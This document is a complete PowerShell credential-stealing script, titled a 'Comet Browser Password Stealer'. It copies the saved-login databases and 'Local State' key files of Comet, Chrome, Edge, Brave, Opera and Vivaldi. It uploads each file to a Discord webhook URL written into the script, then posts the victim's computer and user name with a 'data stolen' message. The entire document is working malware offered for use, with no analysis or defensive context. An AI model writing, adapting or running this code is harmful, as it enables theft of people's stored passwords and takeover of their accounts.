# ===== COMET BROWSER PASSWORD STEALER =====
$webhook = "https://ptb.discord.com/api/webhooks/1484372266710995026/jhpU0776tLsCjRN_RiwfH5PFTHg1XaZQJOTcdw0FEBtANImdnEZ4cjf6sT_sh8mHgdbU"

function Send-File {
    param($path, $name)
    try {
        (New-Object Net.WebClient).UploadFile($webhook, $path)
        Write-Host "[+] Sent: $name"
    } catch {
        Write-Host "[-] Failed: $name"
    }
}

# Comet Browser paths (Chromium-based)
$cometPaths = @(
    # Standard Comet installation
    "$env:LOCALAPPDATA\Comet\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Comet\User Data\Local State",
    
    # Alternative Chromium browsers (just in case)
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State",
    "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data",
    "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local State",
    "$env:APPDATA\Vivaldi\User Data\Default\Login Data",
    "$env:APPDATA\Vivaldi\User Data\Local State"
)

$found = $false

foreach ($path in $cometPaths) {
    if (Test-Path $path) {
        $found = $true
        $tempFile = "$env:temp\$([System.IO.Path]::GetFileName($path))"
        Copy-Item $path $tempFile -Force
        Send-File $tempFile ([System.IO.Path]::GetFileName($path))
        Remove-Item $tempFile -Force
    }
}

if (-not $found) {
    $body = @{content = "[!] No Comet/Chromium browser data found on $env:COMPUTERNAME"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
} else {
    $body = @{content = "[+] Comet/Chromium data stolen from $env:COMPUTERNAME - $env:USERNAME"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
}
